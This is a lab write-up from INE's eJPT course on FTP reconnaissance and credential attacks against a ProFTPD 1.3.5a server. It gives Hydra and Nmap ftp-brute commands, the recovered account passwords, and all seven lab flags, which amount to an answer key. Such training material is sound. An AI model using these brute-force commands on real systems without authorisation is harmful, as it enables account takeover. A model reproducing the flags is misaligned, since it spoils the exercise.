# ProFTPd Recon and Credential Attacks - INE eJPT

INE lab focused on FTP service reconnaissance and credential attacks against a ProFTPD server. The objective is to identify the service version, recover valid credentials using Hydra and Nmap NSE, connect as each user, and retrieve seven flags distributed across multiple accounts.

Target: `demo.ine.local` - ProFTPD 1.3.5a on port 21

---

## Enumeration

### Service Version Detection

```bash
nmap -sV demo.ine.local
```

Service identified: ProFTPD 1.3.5a on port 21.

Version detection always precedes credential attacks - it also enables checking for known CVEs specific to this version.

---

## Credential Attacks

### Hydra - Mass Brute Force

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  demo.ine.local -t 4 ftp
```

Valid credentials recovered:

```
sysadmin     : 654321
rooty        : qwerty
demo         : butterfly
auditor      : chocolate
anon         : purple
administrator: tweety
diag         : tigger
```

### Nmap NSE - ftp-brute (Targeted)

For a known username, NSE is faster and more precise than a full dictionary run:

```bash
echo "sysadmin" > users
nmap --script ftp-brute \
  --script-args userdb=/root/users \
  -p 21 demo.ine.local
```

Result: `sysadmin : 654321`

---

## Data Retrieval

Connect as each user and retrieve their file:

```bash
ftp demo.ine.local
# username: sysadmin
# password: 654321
ls
get secret.txt
exit
cat secret.txt
```

Repeat for each credential pair found during brute force.

---

## Flags

```
Flag1: 260ca9dd8a4577fc00b7bd5810298076
Flag2: e529a9cea4a728eb9c5828b13b22844c
Flag3: d6a6bc0db10694a2d90e3a69648f3a03
Flag4: 098f6bcd4621d373cade4e832627b4f6
Flag5: 1bc29b36f623ba82aaf6724fd3b16718
Flag6: 21232f297a57a5a743894a0e4a801fc3
Flag7: 12a032ce9179c32a6c7ab397b9d871fa
```

---

## Key Takeaways

- Version detection before brute force is mandatory. It determines wordlist strategy and surfaces applicable CVEs before committing to a credential attack.
- FTP consistently uses weak or default credentials. Multiple valid accounts on a single service is a common finding in real assessments.
- Hydra handles multi-user mass attacks; NSE `ftp-brute` is better for single-user targeted verification after the initial scan.
- Credential reuse is the follow-on concern: the same passwords found against FTP often work on SSH, SMB, or web applications on the same target.
- Authenticated FTP access is a data channel, not just a foothold. Each accessible file is a potential intelligence or escalation asset.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
